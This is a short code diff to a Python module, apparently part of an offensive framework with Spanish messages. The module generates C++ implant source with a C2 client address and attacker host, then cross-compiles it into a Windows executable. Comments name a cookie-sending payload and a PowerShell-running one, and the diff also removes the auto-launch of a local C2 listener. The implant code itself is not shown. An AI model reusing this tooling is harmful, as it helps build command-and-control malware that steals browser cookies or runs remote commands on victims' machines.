@@ -82,16 +82,17 @@ class multi_stage_channels(Module):
 
 		}
 		''' % (c2client, lhost)
-
 		f = open(fullname,"w")
 		f.write(STARTC2)
 		print("Archivo "+ fullname + " creado.")
-		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
-		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
-		print(args)
-		subprocess.Popen(args)
+		#i686-w64-mingw32-g++ ejecutarPSs.cpp -o ejecuta -static-libgcc -static-libstdc++
+		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++"]
+		p = subprocess.Popen(args)
+		p.terminate()
 		print("Compilado {}".format(outfile))
-		print("Ejecutando listener C2.")
-		time.sleep(5)
-		args = ['terminator', '--new-tab', '-x', 'python3', 'base/modules/c2localclient/c2clientelocal.py']
-		subprocess.Popen(args)
+		print("Inicia tu listener C2.")
+		#time.sleep(1)
+		#args = ['terminator', '-x', 'python3', 'base/modules/c2localclient/c2clientelocal.py']
+		#cmd = "/usr/bin/x-terminal-emulator -e \"python3 base/modules/c2localclient/c2clientelocal.py; sleep 10\""
+		#args = ['terminator' ,'-x', 'echo', 'hello']
+		#subprocess.call(args, start_new_session=True)
